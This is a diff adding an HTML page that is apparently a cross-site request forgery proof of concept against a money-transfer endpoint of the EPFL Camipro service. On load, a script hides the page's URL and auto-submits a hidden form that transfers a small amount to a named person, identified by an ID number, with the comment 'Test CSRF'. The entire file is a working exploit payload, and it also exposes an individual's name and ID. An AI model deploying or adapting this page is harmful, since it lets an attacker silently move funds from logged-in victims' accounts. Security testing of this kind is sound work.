@@ -1,0 +1,16 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://mycamipro.epfl.ch/client/transfer?tequila" method="POST">
+      <input type="hidden" name="transfer&#91;sciperto&#93;" value="326295" />
+      <input type="hidden" name="transfer&#91;nameto&#93;" value="326295&#32;&#58;&#32;Adrien&#32;AndrÃ&#169;&#32;Jacques&#32;Buttier" />
+      <input type="hidden" name="transfer&#91;amount&#93;" value="0&#46;05" />
+      <input type="hidden" name="transfer&#91;comment&#93;" value="Test&#32;CSRF" />
+      <input type="hidden" name="ajax" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
